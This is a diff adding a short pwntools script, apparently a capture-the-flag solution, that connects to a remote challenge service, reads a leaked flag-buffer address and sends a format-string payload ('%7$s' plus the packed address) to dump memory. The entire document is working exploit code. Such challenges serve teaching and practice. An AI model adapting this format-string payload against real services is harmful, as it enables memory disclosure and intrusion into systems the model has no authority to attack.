@@ -1,0 +1,13 @@
+from pwn import *
+io = remote("rivit.dev", 10007)
+#io = process('./task')
+exe = ELF('./task')
+#gdb.attach(io, api=True)
+print(io.recvuntil(b'buffer: 0x'))
+addr = io.recvline(keepends=False)
+flag = int(addr, 16)
+print(f'Flag buffer location: {hex(flag)}')
+print(io.recvuntil(b'format:'))
+payload = b'%7$s----' + p64(flag)
+io.sendline(payload)
+io.interactive()
